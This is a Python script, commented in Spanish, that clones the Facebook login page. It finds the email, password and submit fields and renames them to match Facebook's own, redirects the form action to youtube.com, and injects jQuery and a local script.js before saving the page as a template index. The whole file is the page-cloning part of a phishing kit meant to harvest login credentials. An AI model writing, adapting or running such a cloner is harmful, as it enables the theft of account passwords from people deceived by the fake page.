import requests;
import bs4;
import os
import re;
from bs4 import BeautifulSoup;

#------------------------#
#     CLONNING PAGES     #
#------------------------#

req=requests.get("https://www.facebook.com/login");#REQUEST A FACEBOOK
soup=bs4.BeautifulSoup(req.text,'html.parser');#PARSEO EL CODIGO A CODIGO LEGIBLE HTML

#---------------------------------------------#
#   GETTING DATA(USER,PASSWORD AND SUBMIT)    #
#---------------------------------------------#

path=os.getcwd();

inputs=[];
inputs2=[];
inputs3=[];
inputs4=[];
button=[];
button2=[];
flag=False;
flag2_botones=False;
form_selected=[];
atributo_final="";
atributo_final2="";

atributo_final_form="";

inputs_filtrados=[];

forms=soup.findAll('form',{'method':True});

print(len(forms));

for form in forms:

        filtro1=form.findAll('input', {'placeholder': True});
        filtro2=form.findAll('input',{'autocomplete':True});
        filtro3=form.findAll('input', {'aria-label': True});
        filtro4=form.findAll('input',{'class':'form-control'});

        filtro5=form.findAll('input', {'type': 'submit'});
        filtro6=form.findAll('button', {'type': 'submit'});

        # ------------------------#
        #        FILTER INPUTS    #
        # ------------------------#

        for i in filtro1:

            atributo = i.attrs['placeholder'];
            atributo_conv = str(atributo).lower();

            if ("correo" in atributo_conv or "email" in atributo_conv or "contraseña" in atributo_conv or "password" in atributo_conv):

                flag=True;
                atributo_final="placeholder";
                inputs_filtrados.append(atributo);



        if (flag!=True):

                for i in filtro2:

                    atributo = i.attrs['autocomplete'];
                    atributo_conv = str(atributo).lower();

                    if (
                            "correo" in atributo_conv or "email" in atributo_conv or "contraseña" in atributo_conv or "password" in atributo_conv):
                        flag = True;
                        atributo_final = "autocomplete";
                        inputs_filtrados.append(atributo);

                if (flag !=True):

                        for i in filtro3:

                            atributo = i.attrs['aria-label'];
                            atributo_conv = str(atributo).lower();

                            if (
                                    "correo" in atributo_conv or "email" in atributo_conv or "contraseña" in atributo_conv or "password" in atributo_conv):
                                flag = True;
                                atributo_final = "aria-label";
                                inputs_filtrados.append(atributo)

                        if (flag!=True):

                                for i in filtro4:

                                    atributo = i.attrs['name'];
                                    atributo_conv = str(atributo).lower();

                                    if (
                                            "correo" in atributo_conv or "email" in atributo_conv or "user" in atributo_conv or "log" in atributo_conv or "contraseña" in atributo_conv or "password" in atributo_conv):
                                        flag = True;
                                        atributo_final = "name";
                                        inputs_filtrados.append(atributo)

        # ------------------------#
        #      FILTER BUTTONS     #
        # ------------------------#


        for i in filtro5:

            atributo = i.attrs['value'];
            atributo_conv = str(atributo).lower();

            if ("iniciar" in atributo_conv or "sign" in atributo_conv or "log" in atributo_conv):

                flag2_botones=True;
                atributo_final2="value";
                inputs_filtrados.append(atributo);

        if (flag2_botones!=True):

            for i in filtro6:

                atributo = i.text;
                atributo_conv = str(atributo).lower();


                if ("iniciar" in atributo_conv or "sign" in atributo_conv or "log" in atributo_conv):

                    flag2_botones=True;
                    atributo_final2="string";
                    inputs_filtrados.append(atributo);

        if(flag==True):

            form_selected.append(form);

            atributo_final_form=form.attrs['action'];

            break;

#-----------------#
#   MODIFY DATA   #
#-----------------#

print("-------------")
print("DATA FILTERED");
print("-------------")

for i in inputs_filtrados:
    print(i);

#---------------------#
#      MODIFY USER    #
#---------------------#

form_selected[0].find('input',{str(atributo_final):str(inputs_filtrados[0])})['id']="email";
form_selected[0].find('input',{str(atributo_final):str(inputs_filtrados[0])})['name']="email";

#---------------------#
#      MODIFY PASS    #
#---------------------#

form_selected[0].find('input',{str(atributo_final):str(inputs_filtrados[1])})['id']="pass";
form_selected[0].find('input',{str(atributo_final):str(inputs_filtrados[1])})['name']="pass";

#------------------------------#
#      MODIFY BUTTON SUBMIT    #
#------------------------------#

if(atributo_final2!="string"):

    form_selected[0].find('input',{str(atributo_final2):str(inputs_filtrados[2])})['id']="loginbutton";
    form_selected[0].find('input',{str(atributo_final2):str(inputs_filtrados[2])})['name']="login";

else:

    form_selected[0].find('button',string=str(inputs_filtrados[2]))['id'] = "loginbutton";
    form_selected[0].find('button',string=str(inputs_filtrados[2]))['name'] = "login";

#----------------------#
#      MODIFY FORM     #
#----------------------#

soup.find('form',{'action':str(atributo_final_form)})['action']="https://youtube.com";

#------------------------#
#     ADDING MY SCRIPT   #
#------------------------#

script1=soup.new_tag('script',src="jquery\\dist\\jquery.min.js");
script2=soup.new_tag('script',src="script.js");

soup.html.head.insert(len(soup.html.head),script1);
soup.html.body.insert(len(soup.html.body),script2);

#------------------------#
#    SETTING AS INDEX    #
#------------------------#

with open(path+'\\FILES_CLONNED\\templates\\index.html','w',encoding = 'utf-8') as outfile:

    outfile.write(str(soup));

print("------------------------")
print("CLONING PAGE COMPLETE!!!")
print("------------------------")